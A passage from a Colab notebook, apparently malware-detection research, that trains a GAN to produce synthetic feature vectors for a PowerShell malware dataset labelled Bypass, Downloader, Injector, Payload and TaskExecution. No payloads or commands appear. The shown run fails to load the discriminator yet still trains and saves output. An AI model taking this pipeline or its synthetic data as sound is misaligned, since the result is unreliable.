1.0745682 -1.0608661 -0.7176357 -0.6570568 -1.0762075 0.14365593 1.0755489 -0.8534387 0.94028234 -0.6358447 1.8381406 0.005312264 -0.72512716 0.08226056 0.24870205 -0.351413 0.041766685 -0.18958913 -0.6181606 -0.08741209 -0.5228771 0.9177839 0.24446544 0.6338136 -1.4859933 -0.6335008 0.086163245 0.8442209 -0.97630143 -1.5667174 -0.9464117 0.5114528 -0.11120623 -0.5674655 -0.49658513 -1.1844484 -0.64644337 -0.3031822 0.57547575 -0.20038626 1.8134288 -0.9602688 -1.0800117 -0.38766244 -0.9522065 0.4567787 -0.6325538 -0.3294072 -0.14047645 0.38011664 0.44229388 0.50601023 -0.79810905 0.43550262 0.22892535 -0.30912194 -0.14789003 0.14905733 1.4848742 0.5131532 0.08455272 -0.77163064 -0.28988957 0.54371786 -0.9063875 -2.2191114 0.48285255 -0.94602305 0.13077335 -0.037416827 0.0615119 -0.4860185 -0.92246056 0.067375444 0.6924865 -0.32846454 1.2901331 -0.56415564 0.05939909 -0.02973132 -0.106382236 0.19898483 -0.05270688 -0.039763633 -0.14268461 -0.05018312 -0.0007090378 -0.049162064 -0.0046858867 0.2664806 0.02027939 -0.07524393 -0.05464825 -0.17426103 -0.13455363 -0.04794722 0.043844238 -0.06587546 -0.101460546 0.12927511 0.016721925 0.14372061 -0.0068933982 -0.026140628 0.1282871 -0.11803528 0.073645905 -0.042599294 -0.069641985 -0.13433206 5.362597e-05 -0.07036698 0.08709357 0.04749097 -0.031013625 0.16719498 -0.029749237 0.1878803 0.010249423 0.054354697 0.10295089 -0.112996034 -0.06526672 0.023956662 -0.011610367 0.08006912 -0.058348544 -0.026960798 -0.0722954 0.06767514 -0.07723278 -0.086413935 0.08431682 0.15187322 -0.050594658 0.09441477 -0.20477436 -0.07183781 0.06971484 0.19540782 -0.1454764 0.066978075 0.049995124 -0.0009919463 -0.04179595 0.0765452 0.13423404 0.056625348 -0.076024644 0.016333088 -0.06198391 -0.060327515 -0.14310008 -0.058748882 -0.01392598 0.12228937 -0.002248112 0.003554349 0.017122958 -0.11609224 0.037934642 0.09973798 0.09361718 -0.048604082 0.084365465 0.0747624 -0.033782534 0.031731643 0.18025409 -0.038241267 0.005646511 -0.10241903 -0.03334625 0.15288344 -0.12498501 -0.18908514 -0.18844567 0.023707515 0.09996568 -0.1270408 0.06546248 0.07889792 0.0022960296 0.0486622 -0.038768154 -0.07344342 -0.117482424 0.07687629 -0.10861529 -0.027714618 -0.094733104 0.03900747 -0.022962121 0.025692658 0.13525051 -0.04306722 0.14901026 0.017846487 -0.055974074 -0.072066106 0.0012562919 -0.014699991 0.041148692 -0.096528545 -0.08066586 -0.16087061 0.028513512 -0.06513835 0.39761722 0.38586962 0.7692995 -0.326244 0.12508628 0.40000534 0.5858483 0.19777699 -0.7750685 -0.49380648 0.5171552 0.78178084 -0.39994517 -0.6714166 0.49073878 0.48305562 -0.78650737 -0.73967606 0.53217614 -0.6456028 -0.7380299 -0.32849532 -0.60827225 -0.08872569 -0.34152994 -0.77095026 -0.5880102 -0.7011744 0.15572861 0.083914585 0.0038456055 0.31523907 -0.19430532 0.024166655 0.75096834 0.4510684 -0.832004 -0.13559346 0.8535589 -0.4701562 0.053007293 0.11193474 -1.0987235 0.48828718 0.93626785 -0.53897893 0.43026552 -0.95140344 -0.17057924 0.67526096 0.05623003 0.5261184 -0.6026991 0.19198465 -0.33819875 1.1902019 -0.5972816 -0.39122722 0.565037 -0.93865454 0.5480961 -0.3012921 -0.3917995 0.9215 -0.662302 -0.033092465 -0.02221273 0.09209726 0.9210646 0.08001256 0.0397164 -0.5247219 -0.18718417 -0.29473057 -0.6310861 0.08315378 0.8011483 0.00860687 0.023239471 -0.17914118 -0.2691461 0.2489423 1.2228695 0.18244398 0.9553633 0.1451139 -0.85804176 0.79202414 0.38987607 0.19029187 -0.15348864 0.2076648 -1.0680754 -0.34356752 -0.34586334 -0.010225417 -0.90552336 -0.8315355 0.19526431 -1.0293953 0.12547308 0.041823715 0.05780019 0.8275432 -1.3462706 0.44241044 0.23624307 0.25680265 -0.62779105 0.77274555 -0.11601819 -0.6864362 0.13444102 -0.8015808 -0.7143751 0.16577981 -0.33483475 0.10886692 -0.7514925 -0.17660262 -1.1915495 -0.13305373 0.5105242 -0.2071068 -0.46526167 0.09857408 0.20924631\",\n          \"-0.42086616 -0.21629247 -0.4953043 -0.16170007 -0.60500485 -0.38130713 -0.23727286 0.03539002 0.3936326 -0.24753119 0.15141559 -0.22040209 -0.40873432 -0.05255631 0.051296327 -0.52885395 0.28501797 0.5531336 -0.28509846 -0.099075004 -0.30983114 -0.039433517 -0.15467158 -0.44167823 0.32226595 0.18711768 0.32102573 -0.34464112 0.013780518 0.018296074 0.2041562 0.24507418 -0.09948275 0.22731145 -0.42453146 0.12218712 -0.4182442 0.14082374 -0.045077104 -0.21986799 0.17324929 0.33018714 -0.40653634 0.39410296 0.32442755 -0.015266078 -0.23267336 0.23631598 -0.011559639 -0.18879326 -0.089825876 -0.023534013 0.3248109 0.25070402 -0.09579076 0.38885996 -0.036976214 -0.1944285 0.15451337 0.91340166 -0.1742473 0.27276418 -0.14095928 -0.13775572 0.041377187 -0.039287806 0.049507465 -0.075903974 -0.12029991 0.24864742 0.013067749 -0.054653324 0.045748867 0.15972586 0.29940438 0.048112795 0.004818914 0.11682324 0.62101287 -0.12573896 0.042805634 0.24938801 -0.41346094 0.16726214 0.07563771 0.08659488 -0.111192286 0.021326963 -0.14661226 0.4136974 0.21440805 -0.012120441 -0.03469513 0.46185836 0.18255492 -0.044686925 -0.054189797 0.21794662 -0.23998763 -0.30719164 -0.014538256 -0.19412857 0.1166472 -0.22629166 0.031039605 -0.014214079 0.27219638 0.103027485 0.45830902 0.18501905 0.06577377 -0.22506543 0.06763747 -0.09265059 0.024156392 -0.06588161 -0.066319324 -0.39461526 -0.4394733 -0.055583164 0.065329455 -0.49297175 0.22437295 0.34851274 -0.21809736 0.17613393 0.17623654 -0.13619034 0.82529837 -0.68587816 1.8539602 -0.6284973 0.3619742 -0.93930954 -0.07392409 0.6140935 -0.93153244 0.34126252 0.68935007 -0.2656967 -2.237183 0.80817115 1.8435739 0.44802383 0.7536731 -0.28563613 0.3850259 0.24671485 -0.14673552 0.54094565 -1.3523041 -0.6345495 -0.3556477 -0.23708034 -1.6177027 0.5148803 -0.012492473 -0.49966022 4.8508e-05 -0.09593521 0.38045928 1.3662176 -0.108483866 -1.6669664 0.92883533 -0.5166968 0.11246415 0.10359877 -1.1276919 0.4554918 0.23716326 -0.14456618 1.0876709 -0.78022516 0.09149099 0.77462256 0.47559854 1.3156251 -0.5798063 0.44208822 1.0102144 -1.0964894 0.34165737 1.995146 1.04853 1.086078 0.08951415 1.381731 0.26451367 -0.27318212 0.21361212 0.34301385 0.9151624 0.28492206 1.1038364 -0.40350237 0.4555259 -1.5253228 0.15135624 0.18819691 -0.40917322 -1.770554 -0.618268 -1.3362722 0.76542723 -0.5179275 -1.4626595 0.6087652 -0.4523022 -1.1552362 1.0022434 1.2326095 -0.37962818 -0.43045777 1.2453657 -0.15457281 0.42161125 0.663052 -0.23975919 -2.3184073 -0.7048726 -0.99502313 0.37981966 -0.12208592 0.1314342 -0.33674678 -0.53933734 -0.10664315 0.03746662 -0.5716556 -0.6899704 0.86063945 -0.036267348 0.6649133 -0.4672856 0.84991163 0.4556396 -0.6192685 0.4905967 0.045968603 0.005624629 0.11914859 -2.3929293 -0.3997272 -0.6858075 0.010635699 0.7244267 0.16746597 -1.4283934 -0.80996364 -0.07109838 -0.16817093 -0.36872223 1.5820822 -0.5228135 0.144787 -0.02032225 0.058572084 0.13084137 0.041012663 -0.085662335 -0.11360854 0.08957821 0.102168836 0.014258049 0.021243993 0.14985463 0.067645244 0.028488606 -0.0036129619 -0.120959476 -0.018933974 -0.0022868332 0.077349015 -0.022847084 -0.09431676 0.07922849 0.061417945 0.12589064 -0.074994296 0.05289559 7.036398e-05 -0.019169074 0.12333821 0.010953602 0.021431953 -0.07336171 0.056161936 0.010349466 -0.03485968 -0.060055252 -0.060611043 0.10315955 -0.00771287 0.07049854 -0.088230655 -0.018784132 0.10096048 -0.10643491 -0.11394205 0.043311022 0.05551192 -0.07212028 0.025787104 -0.016680164 0.056138415 -0.024387604 0.0076130917 -0.11621194 0.039398286 0.11773033 -0.093076155 0.050836932 -0.07947829 -0.030897534 -0.0021772506 0.012436398 -0.040579908 -0.027551174 -0.07904026 0.0070896912 -0.048331834 -0.028518664 0.07380373 0.02230416 -0.0013595134 -0.03366021 0.110782176 -0.013326385 -0.05522537 -0.020827888 -0.008909229 0.13042866 0.054689832 -0.053375956 -0.05146006 -0.07805238 0.07675641 0.0070840865 0.037734494 0.030524349 0.026483512 0.117699325 -0.09351651 0.018319357 0.14594239 -0.057619896 -0.041769262 -0.031810332 -0.03880334 0.05337574 -0.03147674 -0.012360064 -0.10640661 0.07987743 0.10042292 -0.13243306 0.066278435 0.095038734 -0.014577884 -0.00071451836 -0.07495934 -0.06267935 0.03780526 -0.026304249 -0.027188122 0.009229791 -0.08037754 -0.09620908 0.0757688 0.022698086 0.1212691 0.091476776 0.106933944 -0.0211922 -0.03092592 -0.020129517 -0.04711724 0.08510376 -0.10742592 -0.0044869417 -0.04213394 -0.12171631 -0.01288728 0.20898052 0.41809472 0.37060574 0.6675123 -0.44972932 -0.07305121 0.7896865 0.7507795 -0.22178227 -0.016836222 -0.3804389 0.2647107 0.5490633 -1.0538341 -0.3999274 0.3790403 0.4573079 -1.1510711 -1.2699685 0.9339747 -0.066485725 -1.124709 0.011639431 -0.36026573 -0.2813882 0.013667514 -0.6747453 -0.6958564 -0.7504027 0.16957578 0.31347182 0.0771541 -0.3059955 0.050561905 -0.35779926 0.5743877 0.55137223 -1.0807459 0.27562606 -0.0044979323 -0.20673776 0.07345722 -0.49762392 -0.7931432 0.7395296 0.8510971 -0.6105157 0.3638623 -0.99055934 0.59201515 0.4659432 0.7116592 0.24853648 -0.095418386 -0.15121232 -0.7687809 1.1940627 -0.38556403 -0.3286996 0.28132448 -1.331709 0.1928147 -0.080164716 0.032545295 1.0576109 -0.44930252 0.12187404 0.12155962 0.8880368 0.75637585 0.22110641 0.2857211 -0.41557354 -0.08286467 -0.21573281 -0.065238565 0.02392054 0.621057 -0.52726364 -0.012013202 -0.34622693 0.021979699 0.60849506 0.8003246 0.02589613 1.12691 0.3463024 -0.6621771 0.7582003 0.2133444 0.36357 -0.37954697 0.39352176 -1.0973814 -0.34109437 -0.22495814 0.2520083 -0.93373036 -0.32853663 0.40468258 -1.0212345 0.5410025 -0.20819725 0.13006632 0.2727893 -1.1905527 0.24798015 0.27205902 0.16256097 -0.81376415 0.229482 -0.18066674 -0.926136 0.69211376 -0.40318838 -0.36306676 -0.101988375 0.117083296 0.16377708 -0.4586164 -0.33590648 -1.1388098 0.032419495 0.5934248 -0.28873208 -0.6889919 0.11631159 0.0029659953\",\n          \"-0.5079038 -0.31426853 -0.7043277 -0.22835706 -0.8088491 -0.3522849 -0.19376382 -0.12916946 0.2319998 -0.266593 0.17691372 -0.42146948 -0.6006197 -0.15317751 0.019474177 -0.6668838 0.34160405 0.83769023 -0.065112546 -0.21936059 -0.62520313 0.13756256 -0.18739301 -0.5733255 0.5113224 0.21065998 0.49405807 -0.517001 -0.15555796 -0.12496205 0.62110734 0.25567433 -0.1400528 0.4705951 -0.30396625 0.15295945 -0.48677376 0.29062083 -0.058611136 -0.2009689 0.31922546 0.3836204 -0.5073458 0.50049275 0.21118781 0.05613384 -0.21189165 0.44806284 -0.16024716 -0.33765247 0.28951743 -0.084309496 0.3596751 0.36808142 -0.088653736 0.49371523 -0.19174924 -0.04952139 0.3624606 1.3586661 -0.005389678 0.48674214 0.16430633 0.018530272 0.04335352 -0.03125248 0.09750572 -0.010788841 -0.0956194 0.29202482 -0.039592437 -0.09866322 -0.063853696 0.30523568 0.5442736 -0.31305298 0.17811775 -0.02894606 0.6206103 -0.10880676 -0.00031916337 0.20165592 -0.4872864 0.39415285 0.25348526 0.3320932 0.18843405 0.0102258725 -0.48133275 0.5012952 0.27982906 0.030761398 0.044435117 0.7543291 0.32403225 0.19128945 0.14074925 0.30738816 -0.29259533 -0.29979956 0.093304195 -0.26694697 0.06939357 -0.3558006 -0.09454871 0.008199959 0.30231515 0.29942453 0.47343758 0.29740307 0.14244238 -0.20391391 0.14560172 -0.024992872 0.16431926 -0.15913762 -0.08919464 -0.71713763 -0.6788124 -0.081475765 0.24435028 -0.5865333 0.3011418 0.18683693 -0.21978489 0.41176575 0.6123158 -0.021631185 0.839583 -0.05890274 1.5401677 -1.04353 -0.8284605 -0.40282062 -0.1817225 -0.15581098 -0.5179213 -0.6762284 0.038671177 -0.5015194 -1.4102651 0.9630381 0.95880777 -0.5728484 -0.17389922 -0.41156635 0.26053396 0.6703599 0.14867091 0.25550205 -0.3546502 0.5026594 -0.3783293 0.1168789 -0.84203166 0.584771 0.506659 -0.41798905 -0.6350823 0.7984998 0.037659016 -0.06392398 0.16061021 -1.7400738 -0.036136743 0.3384947 -0.7440456 0.28184792 -0.3394551 0.20923004 -0.16389267 0.24205084 0.744668 -0.009431467 0.97452855 -0.26425755 0.81922454 1.4393309 -1.2532893 -0.14649348 0.1865616 -0.96923983 0.8657331 1.900126 0.47818825 0.6451448 -0.6196672 0.4070667 0.9238432 -1.1965146 0.058706228 0.48043677 0.6745606 0.21689725 0.68986964 -0.5113666 -0.03492175 -1.2275764 0.74849015 0.5520041 0.04905553 -0.58346313 -0.26214418 0.1839369 0.6582246 -0.5712755 -0.8406034 -0.14043657 0.3794994 -0.7872381 -0.27691165 -0.13332032 -0.8627517 -0.24564101 0.13382797 0.2920099 0.94329643 1.1961894 -1.0139908 -0.9570898 -0.46377957 -0.6547186 0.55138016 0.49993762 -0.66797346 -0.13745837 -0.2194735 0.4630275 0.054574355 -0.48346835 0.40108603 0.19537987 -0.5356114 0.35390082 0.3167349 -0.12257686 -0.3298845 0.16014485 0.019028842 -0.3760991 0.48739824 0.081433244 -1.71698 0.6741941 -0.8537102 -0.02093449 0.7140458 1.0754656 -0.003185833 -0.16238724 -0.11766593 0.3476164 -0.11710144 0.47713163 -0.4914664 0.12153166 -0.02480243 0.08089032 0.15848473 0.021424484 -0.08218758 -0.12450573 0.09748161 0.1052631 0.040588874 0.041404337 0.17185883 0.09674633 0.05630635 -0.029320698 -0.14700061 -0.018853461 -0.013247099 0.100912705 0.002971531 -0.094502136 0.07683414 0.062015135 0.14657629 -0.10575656 0.048873592 0.0133230835 -0.018693551 0.14522775 0.04529284 0.045133278 -0.06904117 0.083226025 -0.023399971 -0.021370701 -0.07342926 -0.075537674 0.10747986 0.015298868 0.09179793 -0.10625442 0.009915102 0.11841114 -0.114403486 -0.13839075 0.063705646 0.07421597 -0.071143284 -0.0013103196 -0.043151412 0.04518476 -0.0053598695 -0.006823333 -0.14368135 0.0516931 0.12611975 -0.11169088 0.050707728 -0.07923177 -0.02837186 -0.040404867 0.018938271 -0.05330474 -0.020641785 -0.08059782 0.013671591 -0.07280478 -0.039148495 0.076033086 0.040767416 -0.009890591 -0.06785343 0.12043132 -0.01062814 -0.038154222 -0.044874135 -0.0115687605 0.15034926 0.0798856 -0.0645372 -0.039593063 -0.10479554 0.09585579 -0.010948757 0.019724306 0.06351714 0.025290735 0.13732821 -0.110231854 0.035634402 0.17167412 -0.08635175 -0.058904037 -0.055085845 -0.05546578 0.03321867 -0.059584133 0.021602701 -0.11387485 0.10641119 0.11355962 -0.14669809 0.07618302 0.10628939 -0.04102269 -0.026846027 -0.07894163 -0.09257984 0.03022809 -0.027685057 -0.011028521 0.013655212 -0.07796396 -0.11105999 0.07774249 0.016516034 0.13830686 0.1016833 0.114124864 -0.013723558 -0.036309846 -0.032423075 -0.048643183 0.08466194 -0.11075721 -0.028611643 -0.068316296 -0.14718652 -0.03432469 0.6603435 0.53078836 0.847861 1.0256972 -0.0716474 1.1442916 0.1763854 -0.2449872 -1.042178 -0.3021666 -0.4997893 0.53653336 0.65212226 -0.13739133 -0.16523756 0.89098126 -1.5047053 0.38420218 0.16459213 1.5444312 -1.199118 -0.21366458 -0.6283503 0.13387242 0.20017304 -0.1502816 -1.1317252 -0.16557717 -0.72882867 0.5472834 0.9121257 0.009164919 0.5192241 -0.61942095 0.15904978 0.09703672 0.6075889 -0.89032394 -0.94484675 1.2279214 -0.8273764 -0.8446956 0.038718063 -1.445253 1.0855172 0.8175189 -1.2473004 0.12093582 -0.8028015 0.070599794 1.4392607 1.1982096 0.7160855 0.18260005 0.3864459 0.62299526 1.7098137 -0.9518947 -0.40607005 0.39763954 -0.92130643 0.12531355 0.2808666 -0.0035866082 1.4946326 -1.1491407 0.31249362 -0.48736572 -0.5350336 -0.07021769 -0.3390364 0.00052128633 -1.2229543 0.34145802 -0.72486526 -0.90818095 -0.70693016 0.5182521 0.41552407 0.52806276 -0.034011085 -0.46862274 0.15580645 1.436058 -0.0127421655 1.4012381 -0.0053479117 -0.4834674 0.6133152 0.064315096 0.6818218 0.54891694 0.8848286 -0.7480851 0.15330596 -0.18769588 -0.1857131 -1.0438923 -0.6250563 0.72075945 -0.76298296 0.26768643 0.12805063 -0.23066422 -0.15485682 -1.1814309 1.5134385 0.40859252 -1.7315594 -1.1352761 1.3971032 -0.4937583 0.20169266 -1.1872172 -0.7071112 -1.2233447 0.2490323 0.60576266 0.29412687 -0.35388008 0.6272433 -0.74916136 -1.3300186 0.075238995 -0.83843297 -1.4450618 0.57468075 -0.02539694\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {},
          "execution_count": 21
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "wZZUHI_gUK4w"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "qCRTE1l1lrtx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# prompt: df.head() and save it to dataset file in type csv in /content/drive/MyDrive/GAN/  with name sample_fushion\n",
        "\n",
        "import os\n",
        "\n",
        "# Create the directory if it doesn't exist\n",
        "output_dir = \"/content/drive/MyDrive/GAN/\"\n",
        "os.makedirs(output_dir, exist_ok=True)\n",
        "\n",
        "output_file = os.path.join(output_dir, \"sample_fushion.csv\")\n",
        "\n",
        "df.head().to_csv(output_file, index=False)\n"
      ],
      "metadata": {
        "id": "qCbT8oKQToe1"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### code below is still ok, but wanna add a mechanisum to handel and process value in Label"
      ],
      "metadata": {
        "id": "QCxnCjKryB-N"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Check point to run project"
      ],
      "metadata": {
        "id": "_bTyp7W69-xb"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### because of built-in -> input of GAN is dataset, and output also dataset ( noise in Fushion Vector)\n"
      ],
      "metadata": {
        "id": "HsQQtxfeyKrg"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### dataset input format: fullpayload-label-fushion\n",
        "#### output have same format, with name synthetic_powershell_malware\n"
      ],
      "metadata": {
        "id": "ZYCiFLk2-kQ8"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "####suitable gan - built in discrim"
      ],
      "metadata": {
        "id": "LxH-d31EzGV0"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import torch\n",
        "import torch.nn as nn\n",
        "import torch.optim as optim\n",
        "import pandas as pd\n",
        "import numpy as np\n",
        "from sklearn.preprocessing import StandardScaler\n",
        "\n",
        "# Load and preprocess dataset\n",
        "def load_and_preprocess_data(csv_path, scaler_params, feature_dim=512):\n",
        "    # Load CSV\n",
        "    data = pd.read_csv(csv_path)\n",
        "\n",
        "    # Define valid labels\n",
        "    valid_labels = {'Bypass', 'Downloader', 'Injector', 'Payload', 'TaskExecution'}\n",
        "\n",
        "    # Log original number of rows\n",
        "    original_rows = len(data)\n",
        "\n",
        "    # Filter rows with valid labels\n",
        "    data = data[data['Label'].isin(valid_labels)]\n",
        "\n",
        "    # Log number of rows removed\n",
        "    removed_rows = original_rows - len(data)\n",
        "    if removed_rows > 0:\n",
        "        print(f\"Removed {removed_rows} rows with invalid labels.\")\n",
        "    else:\n",
        "        print(\"No rows with invalid labels found.\")\n",
        "\n",
        "    # Check if data is empty\n",
        "    if data.empty:\n",
        "        raise ValueError(\"No rows remain after filtering. Check dataset labels.\")\n",
        "\n",
        "    # Print unique labels\n",
        "    unique_labels = data['Label'].unique()\n",
        "    print(f\"Unique labels after filtering: {unique_labels}\")\n",
        "\n",
        "    # Parse FusionVector\n",
        "    features = np.array([np.fromstring(vec, sep=' ') for vec in data['FusionVector']])\n",
        "\n",
        "    # Validate feature dimension\n",
        "    assert features.shape[1] == feature_dim, f\"Expected {feature_dim} features, got {features.shape[1]}\"\n",
        "\n",
        "    # Normalize features using saved scaler\n",
        "    scaler = StandardScaler()\n",
        "    scaler.mean_, scaler.scale_ = scaler_params[0], scaler_params[1]\n",
        "    features = scaler.transform(features)\n",
        "\n",
        "    # Convert to PyTorch tensors\n",
        "    features = torch.FloatTensor(features)\n",
        "\n",
        "    return features, data, scaler\n",
        "\n",
        "# Discriminator Model\n",
        "class Discriminator(nn.Module):\n",
        "    def __init__(self, input_dim, num_classes=5):\n",
        "        super(Discriminator, self).__init__()\n",
        "        self.classifier = nn.Sequential(\n",
        "            nn.Linear(input_dim, 256),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(256, 128),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(128, num_classes)  # 5 classes\n",
        "        )\n",
        "        self.real_fake = nn.Linear(128, 1)\n",
        "\n",
        "    def forward(self, x):\n",
        "        features = self.classifier[:-1](x)\n",
        "        class_logits = self.classifier[-1](features)\n",
        "        real_fake_logit = self.real_fake(features)\n",
        "        return torch.cat([class_logits, real_fake_logit], dim=1)\n",
        "\n",
        "# Generator Model\n",
        "class Generator(nn.Module):\n",
        "    def __init__(self, noise_dim, output_dim):\n",
        "        super(Generator, self).__init__()\n",
        "        self.model = nn.Sequential(\n",
        "            nn.Linear(noise_dim, 128),\n",
        "            nn.BatchNorm1d(128),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Linear(128, 256),\n",
        "            nn.BatchNorm1d(256),\n",
        "            nn.LeakyReLU(0.2),\n",
        "            nn.Linear(256, output_dim),\n",
        "            nn.Tanh()\n",
        "        )\n",
        "\n",
        "    def forward(self, x):\n",
        "        # Add small noise to input for diversity\n",
        "        noise = torch.randn_like(x) * 0.05\n",
        "        return self.model(x + noise)\n",
        "\n",
        "# Train GAN\n",
        "def train_gan(discriminator, generator, features, noise_dim=100, epochs=200, batch_size=64, lr=0.0002):\n",
        "    g_optimizer = optim.Adam(generator.parameters(), lr=lr, betas=(0.5, 0.999))\n",
        "    adversarial_loss = nn.BCEWithLogitsLoss()\n",
        "\n",
        "    discriminator.eval()\n",
        "    for param in discriminator.parameters():\n",
        "        param.requires_grad = False\n",
        "\n",
        "    generator.train()\n",
        "    for epoch in range(epochs):\n",
        "        total_g_loss = 0\n",
        "        for i in range(0, len(features), batch_size):\n",
        "            real_data = features[i:i+batch_size]\n",
        "            batch_size_actual = real_data.size(0)\n",
        "\n",
        "            noise = torch.randn(batch_size_actual, noise_dim)\n",
        "            fake_data = generator(noise)\n",
        "            real_validity = torch.ones(batch_size_actual, 1)\n",
        "\n",
        "            g_optimizer.zero_grad()\n",
        "            g_output = discriminator(fake_data)\n",
        "            g_loss = adversarial_loss(g_output[:, -1:], real_validity)\n",
        "            g_loss.backward()\n",
        "            g_optimizer.step()\n",
        "            total_g_loss += g_loss.item()\n",
        "\n",
        "        if (epoch + 1) % 10 == 0:\n",
        "            avg_g_loss = total_g_loss / (len(features) // batch_size + 1)\n",
        "            print(f\"Epoch {epoch+1}/{epochs}, Generator Loss: {avg_g_loss:.4f}\")\n",
        "\n",
        "    return generator\n",
        "\n",
        "# Generate synthetic dataset\n",
        "def generate_synthetic_dataset(generator, num_samples, noise_dim, scaler, label_encoder_classes, input_data, copy_payload=False):\n",
        "    generator.eval()\n",
        "    with torch.no_grad():\n",
        "        noise = torch.randn(num_samples, noise_dim)\n",
        "        synthetic_data = generator(noise).numpy()\n",
        "\n",
        "    synthetic_data = scaler.inverse_transform(synthetic_data)\n",
        "    synthetic_labels = np.random.choice(label_encoder_classes, size=num_samples)\n",
        "\n",
        "    # Handle Full Payload\n",
        "    if copy_payload:\n",
        "        # Randomly sample Full Payload from input dataset\n",
        "        payload_values = input_data['Full Payload'].dropna().sample(num_samples, replace=True).values\n",
        "    else:\n",
        "        # Use empty strings\n",
        "        payload_values = [''] * num_samples\n",
        "\n",
        "    # Create synthetic dataset\n",
        "    synthetic_df = pd.DataFrame({\n",
        "        'Full Payload': payload_values,\n",
        "        'Label': synthetic_labels,\n",
        "        'FusionVector': [' '.join(map(str, vec)) for vec in synthetic_data]\n",
        "    })\n",
        "\n",
        "    return synthetic_df\n",
        "\n",
        "# Main execution\n",
        "if __name__ == \"__main__\":\n",
        "    # Hyperparameters\n",
        "    feature_dim = 512\n",
        "    noise_dim = 100\n",
        "    batch_size = 64\n",
        "    epochs = 200\n",
        "    num_classes = 5\n",
        "    copy_payload = False  # Set to True to copy random Full Payload values\n",
        "\n",
        "    # Load dataset and scaler\n",
        "    csv_path = \"/content/drive/MyDrive/GAN/fusion_with_vector_extended.csv\"  # Placeholder\n",
        "    try:\n",
        "        scaler_params = np.load(\"scaler_params.npy\", allow_pickle=True)\n",
        "        features, original_data, scaler = load_and_preprocess_data(csv_path, scaler_params, feature_dim)\n",
        "    except Exception as e:\n",
        "        print(f\"Error loading dataset or scaler: {e}\")\n",
        "        exit(1)\n",
        "\n",
        "    # Load label encoder classes\n",
        "    try:\n",
        "        label_encoder_classes = np.load(\"label_encoder_classes.npy\", allow_pickle=True)\n",
        "        if len(label_encoder_classes) != num_classes:\n",
        "            print(f\"Error: Expected {num_classes} labels, found {len(label_encoder_classes)}\")\n",
        "            exit(1)\n",
        "    except Exception as e:\n",
        "        print(f\"Error loading label encoder: {e}\")\n",
        "        exit(1)\n",
        "\n",
        "    # Load discriminator\n",
        "    try:\n",
        "        discriminator = Discriminator(feature_dim, num_classes)\n",
        "        saved_state_dict = torch.load(\"discriminator_model.pth\")\n",
        "        classifier_state_dict = {k: v for k, v in saved_state_dict.items() if k.startswith('classifier')}\n",
        "        discriminator.classifier.load_state_dict(classifier_state_dict)\n",
        "    except Exception as e:\n",
        "        print(f\"Error loading discriminator model: {e}\")\n",
        "        exit(1)\n",
        "\n",
        "    # Initialize generator\n",
        "    generator = Generator(noise_dim, feature_dim)\n",
        "\n",
        "    # Train GAN\n",
        "    try:\n",
        "        generator = train_gan(discriminator, generator, features, noise_dim=noise_dim, epochs=epochs, batch_size=batch_size)\n",
        "    except Exception as e:\n",
        "        print(f\"Error training GAN: {e}\")\n",
        "        exit(1)\n",
        "\n",
        "    # Generate synthetic dataset\n",
        "    try:\n",
        "        synthetic_df = generate_synthetic_dataset(\n",
        "            generator, len(original_data), noise_dim, scaler, label_encoder_classes, original_data, copy_payload=copy_payload\n",
        "        )\n",
        "        synthetic_df.to_csv(\"synthetic_powershell_malware.csv\", index=False, na_rep='')\n",
        "        print(\"Synthetic dataset saved as 'synthetic_powershell_malware.csv'\")\n",
        "    except Exception as e:\n",
        "        print(f\"Error generating synthetic dataset: {e}\")\n",
        "        exit(1)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "J3CrIpFb5BAE",
        "outputId": "810949d3-98c6-4647-c5da-fc62cd7d7f1b"
      },
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Removed 3 rows with invalid labels.\n",
            "Unique labels after filtering: ['Injector' 'Downloader' 'Payload' 'TaskExecution' 'Bypass']\n",
            "Error loading discriminator model: Error(s) in loading state_dict for Sequential:\n",
            "\tMissing key(s) in state_dict: \"0.weight\", \"0.bias\", \"3.weight\", \"3.bias\", \"6.weight\", \"6.bias\". \n",
            "Epoch 10/200, Generator Loss: 0.1042\n",
            "Epoch 20/200, Generator Loss: 0.1031\n",
            "Epoch 30/200, Generator Loss: 0.1029\n",
            "Epoch 40/200, Generator Loss: 0.1028\n",
            "Epoch 50/200, Generator Loss: 0.1027\n",
            "Epoch 60/200, Generator Loss: 0.1026\n",
            "Epoch 70/200, Generator Loss: 0.1026\n",
            "Epoch 80/200, Generator Loss: 0.1026\n",
            "Epoch 90/200, Generator Loss: 0.1026\n",
            "Epoch 100/200, Generator Loss: 0.1026\n",
            "Epoch 110/200, Generator Loss: 0.1026\n",
            "Epoch 120/200, Generator Loss: 0.1026\n",
            "Epoch 130/200, Generator Loss: 0.1026\n",
            "Epoch 140/200, Generator Loss: 0.1026\n",
            "Epoch 150/200, Generator Loss: 0.1026\n",
            "Epoch 160/200, Generator Loss: 0.1026\n",
            "Epoch 170/200, Generator Loss: 0.1026\n",
            "Epoch 180/200, Generator Loss: 0.1026\n",
            "Epoch 190/200, Generator Loss: 0.1026\n",
            "Epoch 200/200, Generator Loss: 0.1026\n",
            "Synthetic dataset saved as 'synthetic_powershell_malware.csv'\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### test"
      ],
      "metadata": {
        "id": "iPdgnIPX7sjL"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import torch\n",
        "import torch.nn as nn\n",
